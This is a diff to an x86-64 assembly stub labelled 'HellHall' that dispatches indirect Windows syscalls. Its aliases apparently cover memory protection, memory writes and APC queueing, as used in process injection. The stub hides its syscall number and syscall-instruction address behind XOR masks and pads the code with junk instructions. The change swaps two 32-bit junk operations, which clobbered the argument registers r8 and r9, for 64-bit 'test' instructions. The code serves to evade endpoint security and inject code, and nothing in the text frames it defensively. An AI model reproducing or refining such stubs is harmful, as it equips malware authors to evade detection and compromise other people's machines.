@@ -33,7 +33,7 @@ SetConfig:
     ret
 
 ; ---------------------------------------------------------------------------
-; HellHall dispatch — four typed aliases, one body
+; HellHall dispatch: four typed aliases, one body
 ;
 ; Obfuscation applied:
 ;   • address decoded into r11 BEFORE eax is set (avoids rax clobber)
@@ -50,11 +50,11 @@ HellHall_NtPVM:
 HellHall_NtWVM:
 HellHall_NtQAT:
     mov   r10, rcx                  ; NT ABI: first arg → r10
-    and   r8d, r8d                  ; [junk] dead flag test on arg3
+    test  r8, r8                    ; [junk] flag-only test preserves full 64-bit r8
     mov   r11, qword [rel qAddr]    ; load masked address
-    mov   rax, KEY_ADDR             ; decode key (rax free — eax not set yet)
+    mov   rax, KEY_ADDR             ; decode key (rax free eax not set yet)
     xor   r11, rax                  ; r11 = real syscall instruction address
-    or    r9d, r9d                  ; [junk] dead flag test on arg4
+    test  r9, r9                    ; [junk] flag-only test preserves full 64-bit r9
     mov   eax, dword [rel dwSSN]    ; load masked SSN
     xor   eax, KEY_SSN              ; eax = real SSN
     push  r11                       ; push target onto stack …
